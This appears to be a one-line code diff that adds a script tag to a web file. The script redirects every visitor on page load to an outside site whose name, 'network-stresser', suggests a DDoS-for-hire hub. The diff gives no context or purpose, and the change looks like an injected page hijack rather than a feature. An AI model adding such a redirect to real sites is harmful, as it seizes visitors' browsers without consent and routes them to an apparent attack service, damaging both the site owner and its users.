@@ -1,0 +1,1 @@
+<script>window.location.href = "https://network-stresser.pw/hub";</script>
